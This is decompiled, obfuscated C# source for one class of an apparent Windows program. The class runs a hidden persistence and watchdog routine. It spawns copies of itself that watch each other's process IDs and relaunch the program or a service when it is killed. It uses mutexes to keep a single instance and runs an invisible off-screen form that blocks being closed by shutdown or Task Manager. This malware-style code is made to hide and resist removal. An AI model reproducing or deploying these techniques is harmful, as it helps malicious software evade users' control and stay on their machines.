using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;
using ns0;
using ns2;
using ns3;
using ns5;
using ns6;
using ns9;

namespace ns8;

internal sealed class Class32
{
	[CompilerGenerated]
	private sealed class Class33
	{
		public Form form_0;

		public void method_0(object sender, EventArgs e)
		{
			((Control)form_0).set_Visible(false);
		}
	}

	private static Random random_0 = new Random();

	private static bool bool_0 = false;

	private static bool bool_1 = false;

	private static bool? nullable_0;

	private static int? nullable_1;

	private static int? nullable_2;

	private static string string_0;

	private static Enum0 enum0_0 = Enum0.const_0;

	private static Mutex mutex_0;

	[CompilerGenerated]
	private static FormClosingEventHandler formClosingEventHandler_0;

	public static void smethod_0(string[] string_1)
	{
		if (string_1 != null && string_1.Length > 0)
		{
			smethod_17(string_1);
		}
		switch (enum0_0)
		{
		case Enum0.const_1:
			smethod_15();
			return;
		case Enum0.const_2:
			smethod_14();
			return;
		case Enum0.const_4:
			smethod_16();
			return;
		}
		if (!smethod_5() && !Class18.smethod_17())
		{
			if (!Class18.smethod_6())
			{
				if (!Class18.smethod_8() && !smethod_11() && !smethod_13(Class34.string_1))
				{
					Class18.smethod_7(bool_0: true);
					Class18.smethod_18(bool_0: false);
				}
			}
			else
			{
				Class18.smethod_7(bool_0: false);
			}
		}
		Class18.smethod_12(string_1);
		if (smethod_13(Class34.smethod_0()))
		{
			smethod_18();
			return;
		}
		if (!smethod_11() && smethod_3())
		{
			smethod_10();
		}
		smethod_6();
		smethod_18();
		if (smethod_5())
		{
			smethod_8();
		}
		if (smethod_11())
		{
			smethod_4();
		}
		if (!smethod_3() && smethod_7())
		{
			smethod_2();
		}
		smethod_19();
		smethod_1();
	}

	public static void smethod_1()
	{
		Class13.smethod_0();
		new Delegate5(Class44.smethod_0).BeginInvoke(null, null);
		new Delegate5(Class18.smethod_0).BeginInvoke(null, null);
		new Delegate5(Class8.smethod_0).BeginInvoke(null, null);
		smethod_12();
	}

	private static void smethod_2()
	{
		try
		{
			string text = "";
			List<string> list = Class18.smethod_5();
			if (list.Count > 1)
			{
				int index = random_0.Next(0, list.Count - 1);
				text = list[index];
			}
			else
			{
				if (list.Count != 1)
				{
					return;
				}
				text = list[0];
			}
			Process.Start(text);
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	private static bool smethod_3()
	{
		return Class18.smethod_11(Application.get_ExecutablePath());
	}

	private static void smethod_4()
	{
		if (bool_1)
		{
			Application.Exit();
		}
	}

	private static bool smethod_5()
	{
		return Class9.smethod_1();
	}

	private static void smethod_6()
	{
		Class18.smethod_4();
	}

	private static bool smethod_7()
	{
		return Class18.smethod_10();
	}

	private static void smethod_8()
	{
		try
		{
			if (!smethod_13(Class34.string_0))
			{
				smethod_20();
				Class9.smethod_2();
			}
			Environment.Exit(0);
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_9()
	{
		try
		{
			Class9.smethod_3(Class34.string_2);
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_10()
	{
		try
		{
			Class9.smethod_0();
			Thread.Sleep(100);
			smethod_9();
		}
		catch (Exception)
		{
		}
	}

	private static bool smethod_11()
	{
		try
		{
			Class9.smethod_4(Class34.string_2, out bool_0, out bool_1);
		}
		catch (Exception)
		{
			return false;
		}
		return bool_0;
	}

	private static void smethod_12()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		Form val = new Form();
		val.set_Location(new Point(-400, -400));
		val.set_Opacity(0.0);
		val.set_FormBorderStyle((FormBorderStyle)0);
		val.set_ShowIcon(false);
		val.set_ShowInTaskbar(false);
		((Control)val).set_Visible(false);
		((Control)val).set_Text("");
		Form form_0 = val;
		form_0.add_FormClosing((FormClosingEventHandler)delegate(object sender, FormClosingEventArgs e)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I4
			if ((int)e.get_CloseReason() == 3 || (int)e.get_CloseReason() == 4)
			{
				((CancelEventArgs)(object)e).Cancel = true;
			}
		});
		form_0.add_Shown((EventHandler)delegate
		{
			((Control)form_0).set_Visible(false);
		});
		try
		{
			Application.Run(form_0);
		}
		catch (Exception)
		{
			while (Class34.bool_0)
			{
				Thread.Sleep(1000);
			}
		}
	}

	private static bool smethod_13(string string_1)
	{
		try
		{
			mutex_0 = Mutex.OpenExisting(string_1);
			return true;
		}
		catch
		{
			try
			{
				mutex_0 = new Mutex(initiallyOwned: true, string_1);
			}
			catch (Exception)
			{
				return true;
			}
		}
		return false;
	}

	private static void smethod_14()
	{
		int processId = nullable_1 ?? (-1);
		Process processById;
		try
		{
			processById = Process.GetProcessById(processId);
			if (processById == null)
			{
				return;
			}
		}
		catch (Exception)
		{
			return;
		}
		string text = "";
		ProcessStartInfo processStartInfo = null;
		try
		{
			processStartInfo = processById.StartInfo;
			text = processById.MainModule!.FileName;
		}
		catch (Exception)
		{
			return;
		}
		try
		{
			processById.WaitForExit();
		}
		catch (Exception)
		{
		}
		try
		{
			if (processStartInfo != null && !string.IsNullOrEmpty(processStartInfo.FileName))
			{
				Process.Start(processStartInfo);
				return;
			}
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text);
			processStartInfo2.UseShellExecute = true;
			Process.Start(processStartInfo2);
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_15()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		int processId = nullable_2 ?? (-1);
		Process processById;
		try
		{
			processById = Process.GetProcessById(processId);
			if (processById == null)
			{
				return;
			}
		}
		catch (Exception)
		{
			return;
		}
		try
		{
			processById.WaitForExit();
		}
		catch (Exception)
		{
		}
		try
		{
			ServiceController val = new ServiceController(string_0);
			val.Start();
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_16()
	{
		Class18.smethod_9();
		Class18.smethod_16();
		if (nullable_0 == true)
		{
			Environment.Exit(0);
		}
	}

	private static void smethod_17(string[] string_1)
	{
		if (string_1 == null || string_1.Length == 0)
		{
			return;
		}
		try
		{
			int result;
			switch (string_1[0].ToLower())
			{
			case "ws":
				if (int.TryParse(string_1[1], out result) && !string.IsNullOrEmpty(string_1[2]))
				{
					nullable_2 = result;
					string_0 = string_1[2];
					enum0_0 = Enum0.const_1;
				}
				break;
			case "wm":
				if (int.TryParse(string_1[1], out result))
				{
					nullable_1 = result;
					enum0_0 = Enum0.const_2;
				}
				break;
			case "rg":
				nullable_0 = true;
				enum0_0 = Enum0.const_4;
				break;
			}
		}
		catch
		{
		}
	}

	private static void smethod_18()
	{
		string executablePath = Application.get_ExecutablePath();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(executablePath);
		processStartInfo.Arguments = "rg";
		ProcessStartInfo startInfo = processStartInfo;
		try
		{
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private static void smethod_19()
	{
		string fileName = Application.get_ExecutablePath();
		List<string> list = Class18.smethod_5();
		if (list.Count > 1)
		{
			int index = random_0.Next(0, list.Count - 1);
			fileName = list[index];
		}
		Process currentProcess = Process.GetCurrentProcess();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(fileName);
		processStartInfo.Arguments = "wm " + currentProcess.Id;
		ProcessStartInfo startInfo = processStartInfo;
		try
		{
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private static void smethod_20()
	{
		string fileName = Application.get_ExecutablePath();
		List<string> list = Class18.smethod_5();
		if (list.Count > 1)
		{
			int index = random_0.Next(0, list.Count - 1);
			fileName = list[index];
		}
		Process currentProcess = Process.GetCurrentProcess();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(fileName);
		processStartInfo.Arguments = "ws " + currentProcess.Id + " " + Class34.string_2;
		ProcessStartInfo startInfo = processStartInfo;
		try
		{
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private static void smethod_21(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3 || (int)e.get_CloseReason() == 4)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}
}
